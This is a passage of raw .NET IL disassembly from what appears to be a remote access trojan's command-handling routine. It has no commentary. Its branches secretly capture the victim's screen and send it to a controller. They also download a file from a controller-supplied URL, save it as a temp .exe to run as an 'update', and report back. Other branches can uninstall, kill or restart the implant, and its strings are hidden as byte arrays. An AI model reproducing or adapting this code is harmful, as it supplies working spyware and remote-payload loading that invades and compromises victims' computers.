      IL_0ec8:  bne.un     IL_0f69

      .try
      {
        IL_0ecd:  ldc.i4.1
        IL_0ece:  newarr     [mscorlib]System.Byte
        IL_0ed3:  stloc.s    V_109
        IL_0ed5:  ldloc.s    V_109
        IL_0ed7:  ldc.i4.0
        IL_0ed8:  ldc.i4.0
        IL_0ed9:  stelem.i1
        IL_0eda:  ldloc.s    V_109
        IL_0edc:  stloc.s    V_75
        IL_0ede:  ldloc.1
        IL_0edf:  ldc.i4.2
        IL_0ee0:  ldelem.ref
        IL_0ee1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0ee6:  ldc.i4.s   10
        IL_0ee8:  ble.s      IL_0f3a

        IL_0eea:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0eef:  stloc.s    V_78
        IL_0ef1:  ldloc.1
        IL_0ef2:  ldc.i4.0
        IL_0ef3:  ldelem.ref
        IL_0ef4:  ldsfld     string Q.SettingPad::Y
        IL_0ef9:  ldloc.1
        IL_0efa:  ldc.i4.1
        IL_0efb:  ldelem.ref
        IL_0efc:  ldsfld     string Q.SettingPad::Y
        IL_0f01:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0f06:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0f0b:  stloc.s    V_77
        IL_0f0d:  ldloc.s    V_78
        IL_0f0f:  ldarg.0
        IL_0f10:  ldloc.s    V_77
        IL_0f12:  ldarg.0
        IL_0f13:  ldlen
        IL_0f14:  conv.ovf.i4
        IL_0f15:  ldloc.s    V_77
        IL_0f17:  sub.ovf
        IL_0f18:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0f1d:  ldloc.s    V_78
        IL_0f1f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0f24:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0f29:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0f2e:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0f33:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0f38:  stloc.s    V_75
        IL_0f3a:  ldloc.s    V_75
        IL_0f3c:  ldsfld     string [mscorlib]System.String::Empty
        IL_0f41:  ldc.i4.1
        IL_0f42:  call       object Q.BasicFunctions::XR(uint8[],
                                                         string,
                                                         bool)
        IL_0f47:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0f4c:  stloc.s    V_76
        IL_0f4e:  leave.s    IL_0f5f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0f50:  dup
        IL_0f51:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0f56:  stloc.s    V_79
        IL_0f58:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f5d:  leave.s    IL_0f5f

      }  // end handler
      IL_0f5f:  leave      IL_187f

      IL_0f64:  br         IL_11e7

      IL_0f69:  ldloc.s    V_108
      IL_0f6b:  ldloc.s    V_20
      IL_0f6d:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0f72:  ldc.i4.0
      IL_0f73:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f78:  ldc.i4.0
      IL_0f79:  bne.un     IL_10b9

      IL_0f7e:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0f83:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0f88:  stloc.s    V_120
      IL_0f8a:  ldloca.s   V_120
      IL_0f8c:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0f91:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0f96:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0f9b:  stloc.s    V_121
      IL_0f9d:  ldloca.s   V_121
      IL_0f9f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0fa4:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_0fa9:  stloc.s    V_83
      IL_0fab:  ldloc.s    V_83
      IL_0fad:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_0fb2:  stloc.s    V_80
      IL_0fb4:  ldloc.s    V_80
      IL_0fb6:  ldc.i4.0
      IL_0fb7:  ldc.i4.0
      IL_0fb8:  ldc.i4.0
      IL_0fb9:  ldc.i4.0
      IL_0fba:  ldloca.s   V_122
      IL_0fbc:  ldloc.s    V_83
      IL_0fbe:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_0fc3:  ldloc.s    V_83
      IL_0fc5:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0fca:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_0fcf:  ldloc.s    V_122
      IL_0fd1:  ldc.i4     0xcc0020
      IL_0fd6:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_0fdb:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_0fe0:  ldloc.s    V_80
        IL_0fe2:  ldloca.s   V_121
        IL_0fe4:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_0fe9:  ldloca.s   V_122
        IL_0feb:  ldc.i4.s   32
        IL_0fed:  ldc.i4.s   32
        IL_0fef:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_0ff4:  ldloc.s    V_122
        IL_0ff6:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_0ffb:  ldloc.s    V_121
        IL_0ffd:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_1002:  leave.s    IL_1013

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1004:  dup
        IL_1005:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_100a:  stloc.s    V_84
        IL_100c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1011:  leave.s    IL_1013

      }  // end handler
      IL_1013:  ldloc.s    V_80
      IL_1015:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_101a:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_101f:  stloc.s    V_81
      IL_1021:  ldloc.s    V_20
      IL_1023:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_1028:  ldsfld     string Q.SettingPad::Y
      IL_102d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1032:  stloc.s    V_111
      IL_1034:  ldloca.s   V_111
      IL_1036:  call       uint8[] Q.BasicFunctions::SB(string&)
      IL_103b:  starg.s    b
      IL_103d:  ldloc.s    V_81
      IL_103f:  ldarg.0
      IL_1040:  ldc.i4.0
      IL_1041:  ldarg.0
      IL_1042:  ldlen
      IL_1043:  conv.ovf.i4
      IL_1044:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1049:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_104e:  stloc.s    V_82
      IL_1050:  ldloc.s    V_83
      IL_1052:  ldloc.1
      IL_1053:  ldc.i4.1
      IL_1054:  ldelem.ref
      IL_1055:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_105a:  ldloc.1
      IL_105b:  ldc.i4.2
      IL_105c:  ldelem.ref
      IL_105d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1062:  ldnull
      IL_1063:  ldloc.s    V_123
      IL_1065:  callvirt   instance class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::GetThumbnailImage(int32,
                                                                                                                                       int32,
                                                                                                                                       class [System.Drawing]System.Drawing.Image/GetThumbnailImageAbort,
                                                                                                                                       native int)
      IL_106a:  ldloc.s    V_82
      IL_106c:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_1071:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_1076:  ldloc.s    V_81
      IL_1078:  ldloc.s    V_82
      IL_107a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_107f:  ldc.i4.0
      IL_1080:  ldloc.s    V_82
      IL_1082:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_1087:  conv.ovf.i4
      IL_1088:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_108d:  ldloc.s    V_81
      IL_108f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1094:  call       bool Q.BasicFunctions::SendMe(uint8[])
      IL_1099:  pop
      IL_109a:  ldloc.s    V_81
      IL_109c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_10a1:  ldloc.s    V_82
      IL_10a3:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_10a8:  ldloc.s    V_83
      IL_10aa:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_10af:  leave      IL_187f

      IL_10b4:  br         IL_11e7

      IL_10b9:  ldloc.s    V_108
      IL_10bb:  ldloc.s    V_24
      IL_10bd:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_10c2:  ldc.i4.0
      IL_10c3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_10c8:  ldc.i4.0
      IL_10c9:  bne.un     IL_11e7

      IL_10ce:  ldc.i4.1
      IL_10cf:  newarr     [mscorlib]System.Byte
      IL_10d4:  stloc.s    V_128
      IL_10d6:  ldloc.s    V_128
      IL_10d8:  ldc.i4.0
      IL_10d9:  ldc.i4.s   126
      IL_10db:  stelem.i1
      IL_10dc:  ldloc.s    V_128
      IL_10de:  stloc.s    V_85
      IL_10e0:  ldc.i4.2
      IL_10e1:  newarr     [mscorlib]System.Byte
      IL_10e6:  stloc.s    V_128
      IL_10e8:  ldloc.s    V_128
      IL_10ea:  ldc.i4.0
      IL_10eb:  ldc.i4.s   42
      IL_10ed:  stelem.i1
      IL_10ee:  ldloc.s    V_128
      IL_10f0:  ldc.i4.1
      IL_10f1:  ldc.i4.s   33
      IL_10f3:  stelem.i1
      IL_10f4:  ldloc.s    V_128
      IL_10f6:  stloc.s    V_86
      IL_10f8:  ldc.i4.1
      IL_10f9:  newarr     [mscorlib]System.Byte
      IL_10fe:  stloc.s    V_128
      IL_1100:  ldloc.s    V_128
      IL_1102:  ldc.i4.0
      IL_1103:  ldc.i4.s   33
      IL_1105:  stelem.i1
      IL_1106:  ldloc.s    V_128
      IL_1108:  stloc.s    V_87
      IL_110a:  ldc.i4.1
      IL_110b:  newarr     [mscorlib]System.Byte
      IL_1110:  stloc.s    V_128
      IL_1112:  ldloc.s    V_128
      IL_1114:  ldc.i4.0
      IL_1115:  ldc.i4.s   64
      IL_1117:  stelem.i1
      IL_1118:  ldloc.s    V_128
      IL_111a:  stloc.s    V_88
      IL_111c:  ldloc.1
      IL_111d:  ldc.i4.1
      IL_111e:  ldelem.ref
      IL_111f:  stloc.s    V_124
      IL_1121:  ldloc.s    V_124
      IL_1123:  ldloc.s    V_85
      IL_1125:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_112a:  ldc.i4.0
      IL_112b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1130:  ldc.i4.0
      IL_1131:  bne.un.s   IL_1174

      IL_1133:  ldc.i4.4
      IL_1134:  newarr     [mscorlib]System.Byte
      IL_1139:  stloc.s    V_128
      IL_113b:  ldloc.s    V_128
      IL_113d:  ldc.i4.0
      IL_113e:  ldc.i4.s   46
      IL_1140:  stelem.i1
      IL_1141:  ldloc.s    V_128
      IL_1143:  ldc.i4.1
      IL_1144:  ldc.i4.s   105
      IL_1146:  stelem.i1
      IL_1147:  ldloc.s    V_128
      IL_1149:  ldc.i4.2
      IL_114a:  ldc.i4.s   110
      IL_114c:  stelem.i1
      IL_114d:  ldloc.s    V_128
      IL_114f:  ldc.i4.3
      IL_1150:  ldc.i4.s   105
      IL_1152:  stelem.i1
      IL_1153:  ldloc.s    V_128
      IL_1155:  stloc.s    V_89
      IL_1157:  ldsfld     string Q.Loader::Stu
      IL_115c:  ldloc.s    V_89
      IL_115e:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_1163:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1168:  ldloc.1
      IL_1169:  ldc.i4.3
      IL_116a:  ldelem.ref
      IL_116b:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                       string)
      IL_1170:  br.s       IL_11e2

      IL_1172:  br.s       IL_11e2

      IL_1174:  ldloc.s    V_124
      IL_1176:  ldloc.s    V_86
      IL_1178:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_117d:  ldc.i4.0
      IL_117e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1183:  ldc.i4.0
      IL_1184:  bne.un.s   IL_1194

      IL_1186:  ldsfld     string Q.SettingPad::SeN
      IL_118b:  call       void Q.BasicFunctions::DS(string)
      IL_1190:  br.s       IL_11e2

      IL_1192:  br.s       IL_11e2

      IL_1194:  ldloc.s    V_124
      IL_1196:  ldloc.s    V_87
      IL_1198:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_119d:  ldc.i4.0
      IL_119e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11a3:  ldc.i4.0
      IL_11a4:  bne.un.s   IL_11b4

      IL_11a6:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_11ab:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_11b0:  br.s       IL_11e2

      IL_11b2:  br.s       IL_11e2

      IL_11b4:  ldloc.s    V_124
      IL_11b6:  ldloc.s    V_88
      IL_11b8:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_11bd:  ldc.i4.0
      IL_11be:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11c3:  ldc.i4.0
      IL_11c4:  bne.un.s   IL_11e2

      IL_11c6:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
      IL_11cb:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_11d0:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_11d5:  pop
      IL_11d6:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_11db:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_11e0:  br.s       IL_11e2

      IL_11e2:  leave      IL_187f

      IL_11e7:  ldloc.s    V_28
      IL_11e9:  ldloc.s    V_25
      IL_11eb:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_11f0:  ldc.i4.0
      IL_11f1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_11f6:  ldc.i4.0
      IL_11f7:  beq.s      IL_11fe

      IL_11f9:  br         IL_156a

      IL_11fe:  ldnull
      IL_11ff:  stloc.s    V_21
      IL_1201:  ldloc.1
      IL_1202:  ldc.i4.1
      IL_1203:  ldelem.ref
      IL_1204:  ldc.i4.0
      IL_1205:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_120a:  ldc.i4.s   31
      IL_120c:  bne.un     IL_12ff

      .try
      {
        IL_1211:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_1216:  stloc.s    V_91
        IL_1218:  ldloc.1
        IL_1219:  ldc.i4.0
        IL_121a:  ldelem.ref
        IL_121b:  ldsfld     string Q.SettingPad::Y
        IL_1220:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_1225:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_122a:  stloc.s    V_90
        IL_122c:  ldloc.s    V_91
        IL_122e:  ldarg.0
        IL_122f:  ldloc.s    V_90
        IL_1231:  ldarg.0
        IL_1232:  ldlen
        IL_1233:  conv.ovf.i4
        IL_1234:  ldloc.s    V_90
        IL_1236:  sub.ovf
        IL_1237:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_123c:  ldloc.s    V_91
        IL_123e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_1243:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_1248:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_124d:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_1252:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_1257:  stloc.s    V_21
        IL_1259:  leave      IL_13b3

        IL_125e:  leave      IL_12ff

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1263:  dup
        IL_1264:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1269:  stloc.s    V_92
        IL_126b:  ldc.i4.s   12
        IL_126d:  newarr     [mscorlib]System.Byte
        IL_1272:  stloc.s    V_128
        IL_1274:  ldloc.s    V_128
        IL_1276:  ldc.i4.0
        IL_1277:  ldc.i4.s   85
        IL_1279:  stelem.i1
        IL_127a:  ldloc.s    V_128
        IL_127c:  ldc.i4.1
        IL_127d:  ldc.i4.s   112
        IL_127f:  stelem.i1
        IL_1280:  ldloc.s    V_128
        IL_1282:  ldc.i4.2
        IL_1283:  ldc.i4.s   100
        IL_1285:  stelem.i1
        IL_1286:  ldloc.s    V_128
        IL_1288:  ldc.i4.3
        IL_1289:  ldc.i4.s   97
        IL_128b:  stelem.i1
        IL_128c:  ldloc.s    V_128
        IL_128e:  ldc.i4.4
        IL_128f:  ldc.i4.s   116
        IL_1291:  stelem.i1
        IL_1292:  ldloc.s    V_128
        IL_1294:  ldc.i4.5
        IL_1295:  ldc.i4.s   101
        IL_1297:  stelem.i1
        IL_1298:  ldloc.s    V_128
        IL_129a:  ldc.i4.6
        IL_129b:  ldc.i4.s   32
        IL_129d:  stelem.i1
        IL_129e:  ldloc.s    V_128
        IL_12a0:  ldc.i4.7
        IL_12a1:  ldc.i4.s   69
        IL_12a3:  stelem.i1
        IL_12a4:  ldloc.s    V_128
        IL_12a6:  ldc.i4.8
        IL_12a7:  ldc.i4.s   82
        IL_12a9:  stelem.i1
        IL_12aa:  ldloc.s    V_128
        IL_12ac:  ldc.i4.s   9
        IL_12ae:  ldc.i4.s   82
        IL_12b0:  stelem.i1
        IL_12b1:  ldloc.s    V_128
        IL_12b3:  ldc.i4.s   10
        IL_12b5:  ldc.i4.s   79
        IL_12b7:  stelem.i1
        IL_12b8:  ldloc.s    V_128
        IL_12ba:  ldc.i4.s   11
        IL_12bc:  ldc.i4.s   82
        IL_12be:  stelem.i1
        IL_12bf:  ldloc.s    V_128
        IL_12c1:  stloc.s    V_93
        IL_12c3:  ldloc.s    V_11
        IL_12c5:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_12ca:  ldsfld     string Q.SettingPad::Y
        IL_12cf:  ldloc.s    V_93
        IL_12d1:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_12d6:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_12db:  call       bool Q.BasicFunctions::SendIt(string)
        IL_12e0:  pop
        IL_12e1:  ldloc.s    V_12
        IL_12e3:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_12e8:  call       bool Q.BasicFunctions::SendIt(string)
        IL_12ed:  pop
        IL_12ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_12f3:  leave      IL_187f

        IL_12f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_12fd:  leave.s    IL_12ff

      }  // end handler
      IL_12ff:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_1304:  stloc.s    V_23
      .try
      {
        IL_1306:  ldloc.s    V_23
        IL_1308:  ldloc.1
        IL_1309:  ldc.i4.1
        IL_130a:  ldelem.ref
        IL_130b:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_1310:  stloc.s    V_21
        IL_1312:  leave      IL_13b3

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1317:  dup
        IL_1318:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_131d:  stloc.s    V_94
        IL_131f:  ldc.i4.s   12
        IL_1321:  newarr     [mscorlib]System.Byte
        IL_1326:  stloc.s    V_128
        IL_1328:  ldloc.s    V_128
        IL_132a:  ldc.i4.0
        IL_132b:  ldc.i4.s   85
        IL_132d:  stelem.i1
        IL_132e:  ldloc.s    V_128
        IL_1330:  ldc.i4.1
        IL_1331:  ldc.i4.s   112
        IL_1333:  stelem.i1
        IL_1334:  ldloc.s    V_128
        IL_1336:  ldc.i4.2
        IL_1337:  ldc.i4.s   100
        IL_1339:  stelem.i1
        IL_133a:  ldloc.s    V_128
        IL_133c:  ldc.i4.3
        IL_133d:  ldc.i4.s   97
        IL_133f:  stelem.i1
        IL_1340:  ldloc.s    V_128
        IL_1342:  ldc.i4.4
        IL_1343:  ldc.i4.s   116
        IL_1345:  stelem.i1
        IL_1346:  ldloc.s    V_128
        IL_1348:  ldc.i4.5
        IL_1349:  ldc.i4.s   101
        IL_134b:  stelem.i1
        IL_134c:  ldloc.s    V_128
        IL_134e:  ldc.i4.6
        IL_134f:  ldc.i4.s   32
        IL_1351:  stelem.i1
        IL_1352:  ldloc.s    V_128
        IL_1354:  ldc.i4.7
        IL_1355:  ldc.i4.s   69
        IL_1357:  stelem.i1
        IL_1358:  ldloc.s    V_128
        IL_135a:  ldc.i4.8
        IL_135b:  ldc.i4.s   82
        IL_135d:  stelem.i1
        IL_135e:  ldloc.s    V_128
        IL_1360:  ldc.i4.s   9
        IL_1362:  ldc.i4.s   82
        IL_1364:  stelem.i1
        IL_1365:  ldloc.s    V_128
        IL_1367:  ldc.i4.s   10
        IL_1369:  ldc.i4.s   79
        IL_136b:  stelem.i1
        IL_136c:  ldloc.s    V_128
        IL_136e:  ldc.i4.s   11
        IL_1370:  ldc.i4.s   82
        IL_1372:  stelem.i1
        IL_1373:  ldloc.s    V_128
        IL_1375:  stloc.s    V_95
        IL_1377:  ldloc.s    V_11
        IL_1379:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_137e:  ldsfld     string Q.SettingPad::Y
        IL_1383:  ldloc.s    V_95
        IL_1385:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_138a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_138f:  call       bool Q.BasicFunctions::SendIt(string)
        IL_1394:  pop
        IL_1395:  ldloc.s    V_12
        IL_1397:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_139c:  call       bool Q.BasicFunctions::SendIt(string)
        IL_13a1:  pop
        IL_13a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_13a7:  leave      IL_187f

        IL_13ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_13b1:  leave.s    IL_13b3

      }  // end handler
      IL_13b3:  nop
      IL_13b4:  ldloc.s    V_12
      IL_13b6:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_13bb:  call       bool Q.BasicFunctions::SendIt(string)
      IL_13c0:  pop
      IL_13c1:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_13c6:  ldc.i4.4
      IL_13c7:  newarr     [mscorlib]System.Byte
      IL_13cc:  stloc.s    V_109
      IL_13ce:  ldloc.s    V_109
      IL_13d0:  ldc.i4.0
      IL_13d1:  ldc.i4.s   46
      IL_13d3:  stelem.i1
      IL_13d4:  ldloc.s    V_109
      IL_13d6:  ldc.i4.1
      IL_13d7:  ldc.i4.s   101
      IL_13d9:  stelem.i1
      IL_13da:  ldloc.s    V_109
      IL_13dc:  ldc.i4.2
      IL_13dd:  ldc.i4.s   120
      IL_13df:  stelem.i1
      IL_13e0:  ldloc.s    V_109
      IL_13e2:  ldc.i4.3
      IL_13e3:  ldc.i4.s   101
      IL_13e5:  stelem.i1
      IL_13e6:  ldloc.s    V_109
      IL_13e8:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_13ed:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_13f2:  stloc.s    V_26
      .try
      {
        IL_13f4:  ldloc.s    V_11
        IL_13f6:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_13fb:  ldsfld     string Q.SettingPad::Y
        IL_1400:  ldc.i4.s   12
        IL_1402:  newarr     [mscorlib]System.Byte
        IL_1407:  stloc.s    V_109
        IL_1409:  ldloc.s    V_109
        IL_140b:  ldc.i4.0
        IL_140c:  ldc.i4.s   85
        IL_140e:  stelem.i1
        IL_140f:  ldloc.s    V_109
        IL_1411:  ldc.i4.1
        IL_1412:  ldc.i4.s   112
        IL_1414:  stelem.i1
        IL_1415:  ldloc.s    V_109
        IL_1417:  ldc.i4.2
        IL_1418:  ldc.i4.s   100
        IL_141a:  stelem.i1
        IL_141b:  ldloc.s    V_109
        IL_141d:  ldc.i4.3
        IL_141e:  ldc.i4.s   97
        IL_1420:  stelem.i1
        IL_1421:  ldloc.s    V_109
        IL_1423:  ldc.i4.4
        IL_1424:  ldc.i4.s   116
        IL_1426:  stelem.i1
        IL_1427:  ldloc.s    V_109
        IL_1429:  ldc.i4.5
        IL_142a:  ldc.i4.s   105
        IL_142c:  stelem.i1
        IL_142d:  ldloc.s    V_109
        IL_142f:  ldc.i4.6
        IL_1430:  ldc.i4.s   110
        IL_1432:  stelem.i1
        IL_1433:  ldloc.s    V_109
        IL_1435:  ldc.i4.7
        IL_1436:  ldc.i4.s   103
        IL_1438:  stelem.i1
        IL_1439:  ldloc.s    V_109
        IL_143b:  ldc.i4.8
        IL_143c:  ldc.i4.s   32
        IL_143e:  stelem.i1
        IL_143f:  ldloc.s    V_109
        IL_1441:  ldc.i4.s   9
        IL_1443:  ldc.i4.s   84
        IL_1445:  stelem.i1
        IL_1446:  ldloc.s    V_109
        IL_1448:  ldc.i4.s   10
        IL_144a:  ldc.i4.s   111
        IL_144c:  stelem.i1
        IL_144d:  ldloc.s    V_109
        IL_144f:  ldc.i4.s   11
        IL_1451:  ldc.i4.s   32
        IL_1453:  stelem.i1
        IL_1454:  ldloc.s    V_109
        IL_1456:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_145b:  ldloc.s    V_26
        IL_145d:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_1462:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_1467:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_146c:  call       bool Q.BasicFunctions::SendIt(string)
        IL_1471:  pop
        IL_1472:  ldc.i4     0x7d0
        IL_1477:  call       object Q.BasicFunctions::Thr(int32)
        IL_147c:  pop
        IL_147d:  ldloc.s    V_26
        IL_147f:  ldloc.s    V_21
        IL_1481:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1486:  ldloc.s    V_26
        IL_1488:  ldc.i4.2
        IL_1489:  newarr     [mscorlib]System.Byte
        IL_148e:  stloc.s    V_109
        IL_1490:  ldloc.s    V_109
        IL_1492:  ldc.i4.0
        IL_1493:  ldc.i4.s   46
